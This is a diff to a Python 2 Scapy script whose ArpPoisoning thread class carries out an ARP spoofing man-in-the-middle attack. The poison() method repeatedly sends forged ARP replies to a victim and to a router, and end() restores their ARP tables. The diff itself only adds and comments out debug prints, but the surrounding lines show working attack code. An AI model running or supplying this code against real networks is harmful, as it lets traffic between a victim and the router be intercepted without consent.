@@ -21,19 +21,21 @@ class ArpPoisoning(threading.Thread):
         print "victimMAC: ",self.victimMAC
         getLogger("scapy.runtime").setLevel(logging.ERROR)
         while not exitFlag:
-            print "exitFlag ", exitFlag
+            #print "exitFlag ", exitFlag
             self.poison()
             sleep(1.5)
         self.end()
 
 
     def end(self):
+        print "END on: ", self.victimIP
         send(ARP(op=2, pdst=self.routerIP, psrc=self.victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.victimMAC), count=3)
         send(ARP(op=2, pdst=self.victimIP, psrc=self.routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.routerMAC), count=3)
         sys.exit("Arret de l'attaque...")
 
 
     def poison(self):
+        print "Poison on: ", self.victimIP
         send(ARP(op=2, pdst=self.victimIP, psrc=self.routerIP, hwdst=self.victimMAC))
         send(ARP(op=2, pdst=self.routerIP, psrc=self.victimIP, hwdst=self.routerMAC))
 
